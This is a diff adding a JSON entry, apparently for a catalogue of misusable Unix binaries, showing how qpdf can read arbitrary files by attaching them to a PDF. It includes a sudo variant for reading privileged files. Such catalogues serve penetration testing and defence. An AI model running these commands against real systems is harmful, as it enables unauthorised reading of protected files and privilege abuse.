@@ -1,0 +1,18 @@
+{
+  "functions": {
+    "file-read": [
+      {
+        "code": "qpdf --empty --add-attachment /path/filename -- out.pdf; qpdf out.pdf --show-attachment=filename"
+      },
+      {
+        "description": "`qpdf` can be used to read any arbitrary file accessible to the running user, by attaching the target file to a valid PDF file, and then accessing that attachment. If the user is allowed to run `qpdf` as an elevated user (e.g with `sudo`), privileged files can be read.",
+        "code": "FILE_TO_READ=\"/path/to/file\"\nqpdf --qdf --add-attachment $FILE_TO_READ --key=anykey -- valid.pdf output.pdf\nqpdf --show-attachment=anykey output.pdf"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo qpdf --empty --add-attachment /path/filename -- out.pdf; qpdf out.pdf --show-attachment=filename"
+      }
+    ]
+  }
+}
